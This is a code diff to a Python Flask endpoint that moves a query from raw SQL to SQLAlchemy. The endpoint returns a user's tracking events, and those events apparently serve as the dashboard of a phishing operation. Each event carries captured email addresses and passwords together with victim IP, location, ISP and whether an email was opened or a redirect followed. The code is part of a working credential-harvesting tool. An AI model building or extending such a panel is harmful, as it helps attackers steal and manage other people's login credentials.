@@ -1,6 +1,8 @@
 from flask import Blueprint, request, jsonify, session
-from models.user import User
-from models.link import Link
+from src.models.user import User
+from src.models.link import Link
+from src.models.tracking_event import TrackingEvent
+from src.models.user import db
 import sqlite3
 import os
 
@@ -18,56 +20,35 @@ def get_events():
         return jsonify({'error': 'Not authenticated'}), 401
     
     try:
-        conn = get_db_connection()
-        
-        # Get all tracking events for the user's links
-        query = '''
-        SELECT 
-            te.id,
-            te.timestamp,
-            te.ip_address,
-            te.user_agent,
-            te.country,
-            te.city,
-            te.isp,
-            te.captured_email,
-            te.captured_password,
-            te.status,
-            te.blocked_reason,
-            te.email_opened,
-            te.redirected,
-            te.on_page,
-            l.short_code as tracking_id
-        FROM tracking_events te
-        JOIN links l ON te.link_id = l.id
-        WHERE l.user_id = ?
-        ORDER BY te.timestamp DESC
-        LIMIT 1000
-        '''
-        
-        events = conn.execute(query, (session['user_id'],)).fetchall()
+        # Get all tracking events for the user's links using SQLAlchemy
+        events = db.session.query(TrackingEvent, Link.short_code).join(
+            Link, TrackingEvent.link_id == Link.id
+        ).filter(
+            Link.user_id == session['user_id']
+        ).order_by(
+            TrackingEvent.timestamp.desc()
+        ).limit(1000).all()
         
         events_list = []
-        for event in events:
+        for event, short_code in events:
             events_list.append({
-                'id': event['id'],
-                'timestamp': event['timestamp'],
-                'tracking_id': event['tracking_id'],
-                'ip_address': event['ip_address'],
-                'user_agent': event['user_agent'],
-                'country': event['country'] or 'Unknown',
-                'city': event['city'] or 'Unknown',
-                'isp': event['isp'] or 'Unknown',
-                'captured_email': event['captured_email'],
-                'captured_password': event['captured_password'],
-                'status': event['status'] or 'processed',
-                'blocked_reason': event['blocked_reason'],
-                'email_opened': bool(event['email_opened']),
-                'redirected': bool(event['redirected']),
-                'on_page': bool(event['on_page'])
+                'id': event.id,
+                'timestamp': event.timestamp.isoformat() if event.timestamp else None,
+                'tracking_id': short_code,
+                'ip_address': event.ip_address,
+                'user_agent': event.user_agent,
+                'country': event.country or 'Unknown',
+                'city': event.city or 'Unknown',
+                'isp': event.isp or 'Unknown',
+                'captured_email': event.captured_email,
+                'captured_password': event.captured_password,
+                'status': event.status or 'processed',
+                'blocked_reason': event.blocked_reason,
+                'email_opened': bool(event.email_opened),
+                'redirected': bool(event.redirected),
+                'on_page': bool(event.on_page),
+                'unique_id': event.unique_id
             })
-        
-        conn.close()
         
         return jsonify({
             'success': True,
